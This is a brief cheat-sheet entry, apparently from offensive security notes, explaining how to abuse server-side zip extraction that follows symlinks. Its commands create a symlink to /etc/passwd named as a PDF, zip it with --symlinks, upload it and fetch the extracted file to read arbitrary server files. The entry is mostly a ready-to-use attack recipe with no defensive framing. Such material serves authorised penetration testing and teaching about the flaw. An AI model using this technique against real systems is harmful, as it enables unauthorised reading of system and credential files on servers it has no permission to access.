# ZIP Symlink Arbitrary File Read

If an upload feature accepts a zip and extracts it server-side (e.g. "upload a single PDF inside a zip"), and the extraction follows symlinks, zip up a symlink instead of a real file to read anything the web server user can:

```bash
ln -s /etc/passwd leak.pdf
zip --symlinks leak.zip leak.pdf
# upload leak.zip, then fetch/view whatever path the app serves extracted files from
```
